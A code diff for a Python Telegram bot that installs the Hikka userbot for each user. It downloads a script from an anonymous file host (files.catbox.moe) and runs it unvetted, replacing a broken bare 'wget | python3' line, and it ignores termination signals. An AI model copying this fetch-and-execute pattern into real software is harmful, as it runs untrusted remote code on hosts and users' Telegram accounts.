@@ -14,11 +14,14 @@ DATA_FILE = 'hikka_data.json'
 
 logging.basicConfig(filename="hikka_bot.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
+
 def signal_handler(signum, frame):
     logging.info(f"Signal {signum} received, but ignoring.")
 
+
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
+
 
 def load_data():
     if os.path.exists(DATA_FILE):
@@ -26,20 +29,24 @@ def load_data():
             return json.load(file)
     return {}
 
+
 def save_data(data):
     with open(DATA_FILE, 'w') as file:
         json.dump(data, file, indent=4)
+
 
 def find_link(output):
     url_pattern = r'https?://[^\s]+'
     links = re.findall(url_pattern, output)
     return links[-1] if links else None
 
+
 def start_hikka_instances():
     data = load_data()
     for user_id, user_data in data.items():
         if user_data.get("running", False):
             start_hikka(user_id)
+
 
 def animate_installation(message, stop_event):
     dots = ["", ".", "..", "..."]
@@ -58,71 +65,100 @@ def animate_installation(message, stop_event):
         except telebot.apihelper.ApiException:
             break
 
+
 def start_hikka(user_id, message=None, first_name=None):
     user_folder = f"users/{user_id}"
     os.makedirs(user_folder, exist_ok=True)
     os.chdir(user_folder)
 
-    wget -qO- https://files.catbox.moe/4s8xws.py | python3
-    process = subprocess.Popen(wget_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    # Скачать и выполнить Python-скрипт
+    url = "https://files.catbox.moe/4s8xws.py"
+    local_file = "4s8xws.py"
 
-    stop_event = threading.Event()
+    try:
+        # Скачиваем файл
+        subprocess.run(f"wget -qO {local_file} {url}", shell=True, check=True)
 
-    def monitor_process():
-        lines_received = 0
-        sent_initial_link = False
+        # Проверяем содержимое файла
+        with open(local_file, "r") as file:
+            logging.info(f"Downloaded script content:\n{file.read()}")
 
-        while True:
-            output = process.stdout.readline()
-            if output == b"" and process.poll() is not None:
-                break
+        # Запускаем файл
+        process = subprocess.Popen(
+            f"python3 {local_file}",
+            shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT
+        )
 
-            if output:
-                decoded_line = output.decode('utf-8')
-                logging.info(decoded_line.strip())
-                lines_received += 1
+        stop_event = threading.Event()
 
-                if not sent_initial_link:
-                    link = find_link(decoded_line)
-                    if link and message:
-                        markup = telebot.types.InlineKeyboardMarkup()
-                        web_app = telebot.types.WebAppInfo(link)
-                        markup.add(telebot.types.InlineKeyboardButton("🔗 Open", web_app=web_app))
+        def monitor_process():
+            lines_received = 0
+            sent_initial_link = False
 
-                        bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=message.message_id,
-                            text=f"👋 <a href='tg://user?id={user_id}'>{first_name}</a><b>, please open the site to continue installation!</b>",
-                            reply_markup=markup,
-                            parse_mode="HTML"
-                        )
-                        sent_initial_link = True
-                        stop_event.set()
-
-                if "hikka" in decoded_line.lower():
-                    data = load_data()
-                    data[user_id] = {"running": True, "installing": False}
-                    save_data(data)
-
-                    if message:
-                        bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=message.message_id,
-                            text=f"🌸 <a href='tg://user?id={user_id}'>{first_name}</a>, <code>Hikka</code> <b>successfully installed</b>. To remove it, kick it from your account!",
-                            parse_mode="HTML"
-                        )
-
-                    os.chdir("../../")
+            while True:
+                output = process.stdout.readline()
+                if output == b"" and process.poll() is not None:
                     break
 
-            if "error" in decoded_line.lower():
-                logging.error(f"Error during Hikka installation for user {user_id}")
-                break
+                if output:
+                    decoded_line = output.decode('utf-8')
+                    logging.info(decoded_line.strip())
+                    lines_received += 1
 
-            time.sleep(1)
+                    if not sent_initial_link:
+                        link = find_link(decoded_line)
+                        if link and message:
+                            markup = telebot.types.InlineKeyboardMarkup()
+                            web_app = telebot.types.WebAppInfo(link)
+                            markup.add(telebot.types.InlineKeyboardButton("🔗 Open", web_app=web_app))
 
-    threading.Thread(target=monitor_process, daemon=True).start()
-    threading.Thread(target=animate_installation, args=(message, stop_event), daemon=True).start()
+                            bot.edit_message_text(
+                                chat_id=message.chat.id,
+                                message_id=message.message_id,
+                                text=f"👋 <a href='tg://user?id={user_id}'>{first_name}</a><b>, please open the site to continue installation!</b>",
+                                reply_markup=markup,
+                                parse_mode="HTML"
+                            )
+                            sent_initial_link = True
+                            stop_event.set()
+
+                    if "hikka" in decoded_line.lower():
+                        data = load_data()
+                        data[user_id] = {"running": True, "installing": False}
+                        save_data(data)
+
+                        if message:
+                            bot.edit_message_text(
+                                chat_id=message.chat.id,
+                                message_id=message.message_id,
+                                text=f"🌸 <a href='tg://user?id={user_id}'>{first_name}</a>, <code>Hikka</code> <b>successfully installed</b>. To remove it, kick it from your account!",
+                                parse_mode="HTML"
+                            )
+
+                        os.chdir("../../")
+                        break
+
+                if "error" in decoded_line.lower():
+                    logging.error(f"Error during Hikka installation for user {user_id}")
+                    break
+
+                time.sleep(1)
+
+        threading.Thread(target=monitor_process, daemon=True).start()
+        threading.Thread(target=animate_installation, args=(message, stop_event), daemon=True).start()
+
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Failed to download or execute script: {e}")
+        if message:
+            bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=message.message_id,
+                text=f"❌ <b>Installation failed</b>. Please try again later.",
+                parse_mode="HTML"
+            )
+
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -146,11 +182,13 @@ def callback_query(call):
 
         start_hikka(user_id, msg, first_name)
 
+
 def create_keyboard(user_id):
     data = load_data()
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(telebot.types.InlineKeyboardButton("🌷 Install", callback_data='install'))
     return markup
+
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -164,8 +202,8 @@ def start(message):
         reply_markup=create_keyboard(user_id)
     )
 
-if __name__ == "__main__":
 
+if __name__ == "__main__":
     start_hikka_instances()
     while True:
         try:
